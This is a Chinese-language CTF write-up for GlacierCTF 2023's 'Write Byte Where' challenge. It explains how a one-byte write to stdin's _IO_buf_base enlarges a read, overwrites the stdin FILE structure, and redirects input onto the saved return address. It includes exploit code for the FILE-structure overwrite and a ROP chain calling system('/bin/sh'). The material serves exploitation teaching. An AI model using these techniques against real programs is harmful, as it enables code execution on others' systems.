# GlacierCTF2023 - Write Byte Where

## 题目简述

程序先打印 `/proc/self/maps` 和一个栈地址，然后允许攻击者指定任意地址并写入一个字节。写入后还会执行两次 `getchar()`。给定 libc 版本中，`getchar` 的慢路径依次进入 `__uflow`、`_IO_default_uflow`、`_IO_file_underflow`，最终按 `stdin` 的 `_IO_buf_base` 与 `_IO_buf_end` 发起 `read`。

## 解题过程

从 maps 取得 libc 基址，定位 `_IO_2_1_stdin_`。在 `_IO_FILE` 中 `_IO_buf_base` 位于对象偏移 56；把该指针第二低字节减一，相当于把缓冲区起点向低地址移动 `0x100`，而 `_IO_buf_end` 保持不变。下一次 `getchar()` 因而执行约 `0x101` 字节的扩大读取。

单字节本身作为随后长输入的第一个字节发送，后续内容覆盖到整个 stdin 对象。重建必要字段，并把新的缓冲区指向最终一次 `getchar` 的保存返回地址：

```python
stdin = libc.address + stdin_offset
where = stdin + 56 + 1
send_where(where)

saved_rip = stack_leak - 0x18
byte = ((stdin + 131) >> 8) & 0xff

payload = p8(byte - 1).ljust(126, b"\x00")
payload += p64(0xfbad208b)       # 恢复 flags
payload += p64(stdin)            # 有效的 read_ptr
payload += p64(0) * 5
payload += p64(saved_rip)        # 新 buf_base
payload += p64(saved_rip + 0x200)# 新 buf_end
payload = payload.ljust(0x101, b"\x00")
send_what(payload)
```

这次扩大读取结束后，stdin 的下一次 underflow 会把最多 `0x200` 字节直接读到保存 RIP。发送 libc ROP 链，令 `rdi` 指向 `/bin/sh` 并调用 `system`：

```python
rop = ROP(libc)
rop(rdi=next(libc.search(b"/bin/sh")), rsi=0, rdx=0)
rop.call(libc.sym.system)
send_after_exit_prompt(rop.chain())
```

最终得到：

```text
gctf{m4n_1_l0v3_the_f1l3syst3m!!_s0_much_fun!}
```

官方正文的 7 张图片分别是四段反汇编、stdin 十六进制内存、栈窗口和成功终端；这些信息均已转写为上述调用链、字段偏移、指针值关系与最终输出，因此不保留纯工具截图。

## 方法总结

一个字节写也能通过修改长度或边界字段放大。FSOP 分析不应只盯 vtable；`_IO_buf_base/_IO_buf_end` 同样能把后续合法读取重定向为大范围任意写，再自然转成栈 ROP。
